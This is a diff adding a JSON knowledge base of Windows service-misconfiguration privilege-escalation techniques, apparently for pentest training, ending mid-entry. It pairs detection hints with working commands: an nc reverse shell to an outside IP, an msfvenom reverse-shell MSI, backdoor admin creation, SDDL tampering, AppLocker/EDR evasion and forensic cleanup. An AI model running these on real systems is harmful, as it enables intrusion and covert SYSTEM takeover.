@@ -1,0 +1,770 @@
+{
+  "phase": {
+    "id": "service-misconfigurations",
+    "title": "Service Misconfigurations",
+    "summary": "Abuse misconfigured Windows services: weak ACLs, unquoted paths, hijackable binaries, AlwaysInstallElevated.",
+    "icon": "settings-2"
+  },
+  "nodes": [
+    {
+      "id": "svc-enum",
+      "parent_id": null,
+      "kind": "category",
+      "title": "Service Enumeration",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Discover services, their binaries, start modes, and ACLs.",
+      "description_md": "Begin every service-misconfig path with a wide sweep filtering out built-in Microsoft services to surface third-party (often weakest) services first.",
+      "prerequisites": [
+        "enum-systeminfo"
+      ],
+      "mitre_attack_id": "T1007",
+      "tags": [
+        "enumeration",
+        "services"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Non-Microsoft services",
+          "code": "Get-CimInstance Win32_Service |\n  Where-Object { $_.PathName -notlike 'C:\\Windows\\*' } |\n  Select-Object Name, DisplayName, StartMode, State, PathName, StartName |\n  Format-Table -AutoSize"
+        },
+        {
+          "shell": "cmd",
+          "title": "sc.exe queryex",
+          "code": "sc queryex type= service state= all > services.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1007",
+          "url": "https://attack.mitre.org/techniques/T1007/",
+          "kind": "mitre"
+        }
+      ],
+      "detection_hints": "Mass `sc qc` from a non-admin context is a strong pre-exploit signal in Sysmon 1."
+    },
+    {
+      "id": "svc-unquoted-path",
+      "parent_id": "svc-enum",
+      "kind": "technique",
+      "title": "Unquoted Service Path",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Services whose BINARY_PATH contains spaces but no quotes can be hijacked by planting a binary in an earlier path segment.",
+      "mitre_attack_id": "T1574.009",
+      "tags": [
+        "service-misconfig",
+        "privilege-escalation"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Find unquoted auto-start services",
+          "code": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\""
+        },
+        {
+          "shell": "powershell",
+          "title": "PowerShell equivalent",
+          "code": "Get-CimInstance Win32_Service |\n  Where-Object { $_.PathName -notmatch '^\"' -and $_.PathName -match ' ' -and $_.StartMode -eq 'Auto' } |\n  Select Name, PathName, StartName"
+        },
+        {
+          "shell": "cmd",
+          "title": "Plant + restart",
+          "code": "copy payload.exe \"C:\\Program Files\\Vulnerable\\Service.exe\"\nsc stop VulnSvc\nsc start VulnSvc"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1574.009",
+          "url": "https://attack.mitre.org/techniques/T1574/009/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks — Unquoted Service Paths",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths",
+          "kind": "hacktricks"
+        }
+      ],
+      "detection_hints": "New executables matching `C:\\Program*.exe` patterns; service-account-spawned children of `services.exe` with unexpected image paths.",
+      "description_md": "Windows resolves service binary paths containing spaces by trying progressively longer interpretations. For a path like `C:\\Program Files\\Vendor App\\service.exe`, Windows tries:\n1. `C:\\Program.exe`\n2. `C:\\Program Files\\Vendor.exe`\n3. `C:\\Program Files\\Vendor App\\service.exe`\n\nIf any of those intermediate paths are writable and the path isn't quoted, planting a file at an earlier resolution point hijacks execution.\n\n**Exploitation steps**:\n1. Find a service with an unquoted path that has spaces\n2. Check write permissions on each intermediate directory\n3. Drop a payload named to match the hijack point\n4. Stop and restart the service (or wait for system reboot if it's auto-start)\n\n**Detection tool**: `wmic service get name,pathname` filtered for paths with spaces but no quotes, cross-referenced with write-ACL checks on intermediate directories."
+    },
+    {
+      "id": "svc-weak-acl",
+      "parent_id": "svc-enum",
+      "kind": "technique",
+      "title": "Weak Service ACL (SERVICE_CHANGE_CONFIG)",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "If your user has SERVICE_CHANGE_CONFIG on a service, rewrite its binPath and restart it for code execution as its account.",
+      "mitre_attack_id": "T1543.003",
+      "tags": [
+        "service-misconfig",
+        "accesschk",
+        "privilege-escalation"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "accesschk — writable services",
+          "code": "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\naccesschk.exe /accepteula -uwcqv \"%USERNAME%\" *"
+        },
+        {
+          "shell": "cmd",
+          "title": "Hijack binPath",
+          "code": "sc config VulnSvc binPath= \"C:\\Temp\\nc.exe -e cmd.exe 10.10.14.5 4444\"\nsc config VulnSvc obj= LocalSystem type= own\nsc stop VulnSvc\nsc start VulnSvc"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1543.003",
+          "url": "https://attack.mitre.org/techniques/T1543/003/",
+          "kind": "mitre"
+        },
+        {
+          "title": "AccessChk",
+          "url": "https://learn.microsoft.com/sysinternals/downloads/accesschk",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "The Windows Service Control Manager enforces a DACL on each service object. When `SERVICE_CHANGE_CONFIG` (or the broader `SERVICE_ALL_ACCESS`) is granted to a low-privilege account, any user in that group can call `sc config` to rewrite the `binPath` — the binary the service executes when started.\n\n**Full exploitation chain**:\n1. `accesschk.exe /accepteula -uwcqv \"%USERNAME%\" *` — find services where you have write perms\n2. `sc config <svc> binPath= \"<payload>\"` — redirect to your binary\n3. `sc stop <svc>` then `sc start <svc>` — trigger execution\n4. Payload runs in the service's security context (often SYSTEM)\n\n**Notes**: If you can't stop/start the service directly, a system reboot (if auto-start) achieves the same result. Always save the original binPath for cleanup.",
+      "detection_hints": "EID 7040 (service config changed) correlated with a non-admin account; `sc.exe config` commands in process creation logs; unexpected changes to `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>\\ImagePath`."
+    },
+    {
+      "id": "svc-weak-binary-acl",
+      "parent_id": "svc-enum",
+      "kind": "technique",
+      "title": "Writable Service Binary",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Service binary itself is writable — overwrite with a payload and restart the service.",
+      "mitre_attack_id": "T1574.010",
+      "tags": [
+        "service-misconfig",
+        "binary"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Test writability",
+          "code": "accesschk.exe /accepteula -quvw \"C:\\Program Files\\Vulnerable\\Service.exe\""
+        },
+        {
+          "shell": "cmd",
+          "title": "Backup + overwrite + restart",
+          "code": "copy \"C:\\Program Files\\Vulnerable\\Service.exe\" C:\\Temp\\Service.bak\ncopy payload.exe \"C:\\Program Files\\Vulnerable\\Service.exe\" /Y\nsc stop VulnSvc\nsc start VulnSvc"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1574.010",
+          "url": "https://attack.mitre.org/techniques/T1574/010/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "If a service's binary file itself has weak filesystem ACLs (e.g., `BUILTIN\\Users:(W)` or `Everyone:(F)`), an attacker can overwrite it with a payload and restart the service. The service's security context (often SYSTEM) executes the replacement binary on next start.\n\n**Key difference from svc-weak-acl**: The service configuration itself is legitimate — only the underlying file has weak permissions, which is a filesystem misconfiguration, not a service ACL misconfiguration.\n\n**Steps**:\n1. Locate non-standard services whose binaries are outside `C:\\Windows\\`\n2. Check file ACLs: `accesschk.exe -quvw <binary>` or `icacls <binary>`\n3. Back up the original binary\n4. Overwrite with your payload\n5. `net stop <svc>; net start <svc>` or wait for reboot\n\n**Common pattern**: Third-party software installed under `C:\\Program Files\\VendorName\\` with overly permissive install-time ACLs.",
+      "detection_hints": "File write operations to service binary paths by non-SYSTEM/non-admin accounts; EID 7045 if service is registered fresh; unexpected hashes on monitored service binaries (FIM)."
+    },
+    {
+      "id": "svc-dll-hijack",
+      "parent_id": "svc-enum",
+      "kind": "technique",
+      "title": "Service DLL Hijacking",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Service loads a DLL from a writable directory in its search order — drop a malicious DLL.",
+      "mitre_attack_id": "T1574.001",
+      "tags": [
+        "dll-hijack",
+        "service-misconfig"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Procmon filter",
+          "code": "Operation = CreateFile AND Path ENDS WITH .dll AND Result = NAME NOT FOUND"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1574.001",
+          "url": "https://attack.mitre.org/techniques/T1574/001/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "Service binaries often load DLLs from their installation directory or from directories in the system PATH. If a DLL required by a service binary cannot be found in its expected location, Windows falls back to the full DLL search order. Planting a malicious DLL at a location searched before the legitimate one — or in a directory where the DLL is expected but doesn't exist (phantom DLL) — causes the service to load attacker code at SYSTEM.\n\n**Discovery method** (on a test VM with Procmon):\n1. Filter: `Process Name is <service binary>` AND `Path ends with .dll` AND `Result is NAME NOT FOUND`\n2. Note which writable directories are probed\n3. Drop a matching DLL there\n\n**In-scope checks (without Procmon)**: Enumerate service binary directories for writability; check if any known phantom DLLs (e.g., WLBSCTRL.dll, ntwdblib.dll) apply to installed services.",
+      "detection_hints": "DLL loads from user-writable directories by SYSTEM-context services; new .dll files created in service install directories by non-admin accounts; Sysmon EID 7 (ImageLoaded) for unexpected module paths."
+    },
+    {
+      "id": "svc-always-installed-elevated",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AlwaysInstallElevated MSI",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "When both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, any MSI installs as SYSTEM.",
+      "tags": [
+        "registry",
+        "msi",
+        "privilege-escalation"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Check both keys",
+          "code": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+        },
+        {
+          "shell": "bash",
+          "title": "Build evil MSI (attacker)",
+          "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi"
+        },
+        {
+          "shell": "cmd",
+          "title": "Install on victim",
+          "code": "msiexec /quiet /qn /i C:\\Temp\\evil.msi"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — AlwaysInstallElevated",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated",
+          "kind": "hacktricks"
+        }
+      ],
+      "description_md": "The `AlwaysInstallElevated` group policy sets two registry values that cause the Windows Installer (`msiexec.exe`) to run with SYSTEM privileges regardless of who invokes it. An attacker who can execute an MSI file on a system where both keys are set to 1 effectively runs code as SYSTEM.\n\n**Prerequisites**: Both `HKLM\\...\\Installer\\AlwaysInstallElevated = 1` AND `HKCU\\...\\Installer\\AlwaysInstallElevated = 1` must be set.\n\n**MSI payload creation** (attacker host):\n```bash\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi\n```\n\n**Execution** (victim):\n```cmd\nmsiexec /quiet /qn /i C:\\Temp\\evil.msi\n```\n\n**Discovery**: PowerUp's `Get-RegistryAlwaysInstallElevated` or manual `reg query` on both hives.",
+      "detection_hints": "MSI installation from a non-admin user; process ancestry `msiexec.exe → unexpected child` at SYSTEM; registry key changes to AlwaysInstallElevated (EID 4657)."
+    },
+    {
+      "id": "svc-modify-via-wmi",
+      "parent_id": "svc-enum",
+      "kind": "technique",
+      "title": "Service Modification via WMI",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "When `sc.exe` is blocked by AppLocker / WDAC, set service properties through WMI / CIM directly.",
+      "tags": [
+        "service-misconfig",
+        "wmi",
+        "applocker-bypass"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Set service PathName via CIM",
+          "code": "$svc = Get-CimInstance Win32_Service -Filter \"Name='VulnSvc'\"\nInvoke-CimMethod -InputObject $svc -MethodName Change -Arguments @{ PathName='C:\\Temp\\payload.exe' }"
+        }
+      ],
+      "references": [],
+      "description_md": "When `sc.exe` is blocked by AppLocker or monitored by EDR, the same service configuration changes can be performed through WMI's `Win32_Service` class using `Invoke-CimMethod` or `Set-WmiInstance`. This approach avoids spawning `sc.exe` and can fly under signature-based detection tuned for that binary.\n\n**Use case**: You've found a service with weak ACLs but `sc.exe` is on AppLocker's blocklist, or its invocation triggers an EDR alert. PowerShell or CIM can achieve the identical outcome via WMI.\n\n**Methods available via Win32_Service**:\n- `Change()` — full equivalent to `sc config`; modifies PathName, StartName, etc.\n- `StartService()` / `StopService()` — control the service lifecycle\n\n**Note**: Requires the same level of permissions (SERVICE_CHANGE_CONFIG) as `sc.exe` — WMI is just an alternate delivery mechanism.",
+      "detection_hints": "WMI `Win32_Service.Change()` invocations from non-admin contexts; PowerShell `Invoke-CimMethod` with service method calls; service config changes without corresponding sc.exe process creation."
+    },
+    {
+      "id": "svc-registry-acl",
+      "parent_id": "svc-enum",
+      "kind": "technique",
+      "title": "Writable Service Registry Key",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "summary": "Writable `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>` lets you set ImagePath without sc.exe.",
+      "tags": [
+        "service-misconfig",
+        "registry"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Check ACL on service key",
+          "code": "accesschk.exe /accepteula -kvuqsw hklm\\system\\currentcontrolset\\services"
+        },
+        {
+          "shell": "cmd",
+          "title": "Modify ImagePath via reg",
+          "code": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\payload.exe\" /f"
+        }
+      ],
+      "references": [],
+      "description_md": "Every Windows service stores its configuration under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svcname>`. If the ACL on this registry key grants write access to a low-privilege account, the attacker can directly modify the `ImagePath` value — the same outcome as `sc config binPath` but done entirely through the registry.\n\n**Why this matters**: In environments where `sc.exe` is monitored or AppLocker-blocked, direct registry modification may be less visible. It also enables changing the `Start` type (DWORD) to `2` (auto-start) to ensure execution on next boot.\n\n**Key values to target**:\n- `ImagePath` (REG_EXPAND_SZ) — the binary path\n- `ObjectName` — the account the service runs as\n- `Start` — 2 = auto, 3 = manual, 4 = disabled\n\n**Discovery**: `accesschk.exe /accepteula -kvuqsw hklm\\system\\currentcontrolset\\services`",
+      "detection_hints": "Registry modification events (EID 4657/13) on service keys by non-SYSTEM accounts; unexpected `ImagePath` values in service registry keys."
+    },
+    {
+      "id": "svc-sc-binpath",
+      "kind": "technique",
+      "title": "SERVICE_CHANGE_CONFIG Abuse via sc config binPath",
+      "summary": "Modify a service's binary path to point to an attacker-controlled executable using sc config when SERVICE_CHANGE_CONFIG is granted.",
+      "severity": "critical",
+      "parent_id": "svc-enum",
+      "description_md": "When a user holds `SERVICE_CHANGE_CONFIG` on a service, the `sc config` command can rewrite the `binPath` (ImagePath) to any executable, including a reverse shell or `net user` command. On next service start (or restart), the payload executes in the service's security context—often SYSTEM.\n\nPrerequisites: discovered via `accesschk` or `Get-Acl`; service must be stoppable/startable or a reboot must be feasible.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1574.011",
+      "detection_hints": "Correlate Event ID 7040 (service config changed) with non-administrative accounts. Monitor `sc.exe` execution with `config` subcommand from non-system processes. Audit `HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>\\ImagePath` changes.",
+      "tags": [
+        "service",
+        "binpath",
+        "sc-config",
+        "system"
+      ],
+      "prerequisites": [
+        "svc-weak-acl"
+      ],
+      "related": [
+        "svc-registry-acl"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Overwrite binPath and trigger execution",
+          "code": "sc config VulnSvc binpath= \"C:\\Temp\\payload.exe\"\nsc stop VulnSvc\nsc start VulnSvc",
+          "description": "Replace the service binary path with an attacker payload, then restart the service to execute as SYSTEM.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "binPath inline net user command",
+          "code": "sc config VulnSvc binpath= \"cmd.exe /c net user attacker P@ssw0rd1! /add && net localgroup Administrators attacker /add\"\nsc start VulnSvc",
+          "description": "Execute net user commands via binPath to create a local admin account.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Windows Service Misconfigurations",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path",
+          "kind": "hacktricks"
+        },
+        {
+          "title": "MITRE ATT&CK - Services Registry Permissions Weakness",
+          "url": "https://attack.mitre.org/techniques/T1574/011/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "svc-accesschk-discovery",
+      "kind": "technique",
+      "title": "Weak Service Permission Discovery via accesschk",
+      "summary": "Use Sysinternals accesschk to enumerate services where non-privileged users hold dangerous ACEs such as SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, or WRITE_DAC.",
+      "severity": "info",
+      "parent_id": "svc-enum",
+      "description_md": "Accesschk.exe from Sysinternals rapidly identifies which services grant excessive permissions to low-privileged groups (e.g., `Everyone`, `BUILTIN\\Users`, `NT AUTHORITY\\Authenticated Users`). This is often the first step before chaining to `svc-sc-binpath` or `svc-registry-acl`.\n\nKey flags:\n- `-ucwv`: show write-capable services for current user\n- `-kwv`: scan registry keys\n- `-c \"*\"`: all services",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1007",
+      "detection_hints": "Monitor execution of accesschk.exe, sc.exe with `sdshow`, and PowerShell `Get-Acl` against service objects. Unexpected enumeration of all services by non-admin accounts is suspicious.",
+      "tags": [
+        "enumeration",
+        "accesschk",
+        "acl",
+        "service"
+      ],
+      "prerequisites": [
+        "svc-enum"
+      ],
+      "related": [
+        "svc-weak-acl",
+        "svc-sc-binpath"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Enumerate writable services for current user",
+          "code": "accesschk.exe -uwcv Everyone *\naccesschk.exe -uwcv \"Authenticated Users\" *\naccesschk.exe -uwcv %USERNAME% *",
+          "description": "Find services where the current user or broad groups have write-level access.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "PowerShell fallback enumeration",
+          "code": "Get-WmiObject Win32_Service | ForEach-Object {\n    $svc = $_.Name\n    $sd = (sc.exe sdshow $svc 2>$null)\n    if ($sd -match 'WD|WO|RC') { Write-Output \"$svc : $sd\" }\n}",
+          "description": "PowerShell-based service ACL enumeration when accesschk is unavailable.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "Sysinternals AccessChk",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk",
+          "kind": "msdoc"
+        },
+        {
+          "title": "HackTricks - Windows Service Misconfigurations",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "svc-writable-binary-system",
+      "kind": "technique",
+      "title": "SYSTEM Service with Writable Binary Path",
+      "summary": "Replace the executable of a service running as SYSTEM when the binary file or its parent directory has weak filesystem ACLs allowing write by a low-privileged user.",
+      "severity": "critical",
+      "parent_id": "svc-enum",
+      "description_md": "A service running as `LocalSystem` whose `ImagePath` points to a binary writable by non-admin users can be escalated by simply overwriting the binary. This differs from `svc-weak-binary-acl` in scope—here the focus is on the SYSTEM context and the writable directory (not just the file).\n\nCommon misconfig: third-party software installed under `C:\\Program Files\\VendorApp\\` where `BUILTIN\\Users` has `(W)` on the install directory.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1574.010",
+      "detection_hints": "Baseline service binary hashes. Alert on writes to service ImagePath locations by non-SYSTEM/admin accounts. File integrity monitoring on `C:\\Program Files\\` subdirectories.",
+      "tags": [
+        "service",
+        "binary-hijack",
+        "filesystem-acl",
+        "system"
+      ],
+      "prerequisites": [
+        "svc-enum",
+        "svc-weak-binary-acl"
+      ],
+      "related": [
+        "svc-sc-binpath",
+        "svc-dll-hijack"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Find SYSTEM services with writable binary",
+          "code": "Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' } | ForEach-Object {\n    $path = ($_.PathName -replace '\"','').Split(' ')[0]\n    if (Test-Path $path) {\n        $acl = Get-Acl $path\n        $acl.Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl' -and\n            $_.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller' } |\n            ForEach-Object { Write-Output \"$path : $($_.IdentityReference) : $($_.FileSystemRights)\" }\n    }\n}",
+          "description": "Identify services running as SYSTEM whose binary is writable by non-privileged identities.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Overwrite binary with payload",
+          "code": "copy /Y C:\\Temp\\payload.exe \"C:\\Program Files\\VulnApp\\service.exe\"\nnet stop VulnSvc && net start VulnSvc",
+          "description": "Replace the service executable with a payload and restart.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Services File Permissions Weakness",
+          "url": "https://attack.mitre.org/techniques/T1574/010/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Service Binary Path Writable",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-binaries-with-weak-permissions",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "svc-recovery-actions",
+      "kind": "technique",
+      "title": "Insecure Service Recovery Action Abuse",
+      "summary": "Exploit a service configured to run a program on failure (recovery action) where that program path is attacker-controlled or the recovery action can be modified.",
+      "severity": "high",
+      "parent_id": "svc-enum",
+      "description_md": "Windows services can be configured with failure recovery actions: restart, run a program, or reboot. When `Run Program` is set and the command path is writable or the service's failure configuration can be changed (requires `SERVICE_CHANGE_CONFIG`), an attacker can trigger the service to fail and have their payload run as SYSTEM.\n\nVerify current recovery actions with `sc qfailure <svcname>`. Modify with `sc failure`.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1574.011",
+      "detection_hints": "Monitor Event ID 7023/7031 (service terminated unexpectedly) followed shortly by execution of non-standard processes. Audit `FailureCommand` registry values under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\`.",
+      "tags": [
+        "service",
+        "recovery-action",
+        "failure-command",
+        "system"
+      ],
+      "prerequisites": [
+        "svc-enum",
+        "svc-weak-acl"
+      ],
+      "related": [
+        "svc-sc-binpath"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Query and set service failure recovery",
+          "code": "sc qfailure VulnSvc\nsc failure VulnSvc reset= 0 actions= run/5000 command= \"C:\\Temp\\payload.exe\"\nsc start VulnSvc\ntaskkill /F /IM VulnSvc.exe",
+          "description": "Configure a service to run a payload on first failure, then cause the service to fail.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Query failure commands via registry",
+          "code": "Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Services' | ForEach-Object {\n    $fc = (Get-ItemProperty $_.PSPath -Name FailureCommand -ErrorAction SilentlyContinue).FailureCommand\n    if ($fc) { Write-Output \"$($_.PSChildName): $fc\" }\n}",
+          "description": "Enumerate all services with a FailureCommand set via registry.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Service Recovery Actions",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#service-failure-actions",
+          "kind": "hacktricks"
+        },
+        {
+          "title": "Microsoft sc failure documentation",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-failure",
+          "kind": "msdoc"
+        }
+      ]
+    },
+    {
+      "id": "svc-sdshow-sdset",
+      "kind": "technique",
+      "title": "SERVICE_ALL_ACCESS via sc sdshow / sdset",
+      "summary": "Read and rewrite a service's Security Descriptor using sc sdshow and sc sdset to grant an unprivileged user full control over a privileged service.",
+      "severity": "critical",
+      "parent_id": "svc-enum",
+      "description_md": "Windows services have a Security Descriptor (SDDL) that controls who can query, start, stop, or reconfigure them. If the current user holds `WRITE_DAC` on a service, `sc sdset` can be used to insert an ACE granting `SERVICE_ALL_ACCESS (GA)` to the current user.\n\nExample SDDL injection: append `(A;;RPWPCRCCDCLCSWLOCRRC;;;WD)` to grant `Everyone` full access.\n\nAfter modifying the SD, chain to `svc-sc-binpath` for execution.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1574.011",
+      "detection_hints": "Alert on sc.exe invocations with `sdset`. Monitor Event ID 4670 (permissions on object changed) for service objects. Audit unexpected SDDL modifications.",
+      "tags": [
+        "service",
+        "sddl",
+        "acl",
+        "write-dac",
+        "sc-sdset"
+      ],
+      "prerequisites": [
+        "svc-enum",
+        "svc-accesschk-discovery"
+      ],
+      "related": [
+        "svc-sc-binpath",
+        "svc-weak-acl"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Read and rewrite service SDDL",
+          "code": "sc sdshow VulnSvc\nrem Append (A;;RPWPCRCCDCLCSWLOCRRC;;;WD) to the existing SDDL\nsc sdset VulnSvc \"D:(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPCRCCDCLCSWLOCRRC;;;WD)\"",
+          "description": "Grant Everyone SERVICE_ALL_ACCESS on the target service by rewriting its security descriptor.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Verify new permissions with accesschk",
+          "code": "accesschk.exe -ucwv VulnSvc",
+          "description": "Confirm the modified SDDL grants the expected permissions.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Modify Service Security Descriptor",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-security-descriptor",
+          "kind": "hacktricks"
+        },
+        {
+          "title": "Microsoft sc sdset documentation",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-sdset",
+          "kind": "msdoc"
+        }
+      ]
+    },
+    {
+      "id": "svc-dependent-service",
+      "kind": "technique",
+      "title": "Dependent Service Abuse for Privilege Escalation",
+      "summary": "Exploit a service that depends on a user-controllable service: by replacing the dependency's binary, the dependent privileged service executes attacker code on start.",
+      "severity": "high",
+      "parent_id": "svc-enum",
+      "description_md": "Windows services can declare dependencies via `DependOnService`. When a high-privilege service (e.g., SYSTEM) depends on a lower-privilege service whose binary or config the attacker controls, restarting the dependent chain causes the attacker's code to run in the context of the privileged service.\n\nEnumeration: `sc qc <svcname>` reveals `DEPENDENCIES`. Also query via `Get-Service -DependentServices`.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1574.010",
+      "detection_hints": "Monitor for unusual service dependency modifications in the registry. Alert on stop/start of dependency chains involving SYSTEM services by non-admin accounts.",
+      "tags": [
+        "service",
+        "dependency",
+        "chain",
+        "system"
+      ],
+      "prerequisites": [
+        "svc-enum",
+        "svc-writable-binary-system"
+      ],
+      "related": [
+        "svc-sc-binpath"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Enumerate service dependencies",
+          "code": "sc qc SystemSvc\nrem Look for DEPENDENCIES line\nsc enumdepend LowPrivSvc 4096",
+          "description": "Find which high-privilege services depend on a service the attacker can modify.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Map dependent services",
+          "code": "Get-Service | ForEach-Object {\n    $dep = $_.DependentServices\n    if ($dep.Count -gt 0) {\n        Write-Output \"$($_.Name) is required by: $($dep.Name -join ', ')\"\n    }\n}",
+          "description": "Map all service dependencies to identify high-value targets.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Windows Privilege Escalation Services",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services",
+          "kind": "hacktricks"
+        },
+        {
+          "title": "Microsoft Win32_DependentService Class",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-dependentservice",
+          "kind": "msdoc"
+        }
+      ]
+    },
+    {
+      "id": "svc-create-new",
+      "kind": "technique",
+      "title": "Create New Service with Elevated Execution",
+      "summary": "Register a new service pointing to an attacker binary using sc create when the user has SC_MANAGER_CREATE_SERVICE rights on the Service Control Manager.",
+      "severity": "critical",
+      "parent_id": "svc-enum",
+      "description_md": "The Service Control Manager (SCM) has its own SDDL. If a non-admin user is granted `SC_MANAGER_CREATE_SERVICE` (CC in SDDL), they can register a new service with an arbitrary binary path running as `LocalSystem`.\n\nVerify SCM ACL: `sc sdshow scmanager`. This technique is also possible from an elevated shell to establish persistence.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1543.003",
+      "detection_hints": "Event ID 7045 (new service installed). Monitor `sc.exe create` invocations and `HKLM\\SYSTEM\\CurrentControlSet\\Services` for unexpected new keys. Alert on service creation by non-admin SIDs.",
+      "tags": [
+        "service",
+        "sc-create",
+        "persistence",
+        "system",
+        "scm"
+      ],
+      "prerequisites": [
+        "svc-enum"
+      ],
+      "related": [
+        "svc-sc-binpath",
+        "svc-sdshow-sdset"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Check SCM ACL and create new service",
+          "code": "sc sdshow scmanager\nsc create EvilSvc binpath= \"C:\\Temp\\payload.exe\" start= auto obj= LocalSystem\nsc start EvilSvc",
+          "description": "Verify SC_MANAGER_CREATE_SERVICE rights, then register and start a SYSTEM-context service.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Cleanup: delete service after execution",
+          "code": "sc stop EvilSvc\nsc delete EvilSvc",
+          "description": "Remove the created service to reduce forensic artifacts.",
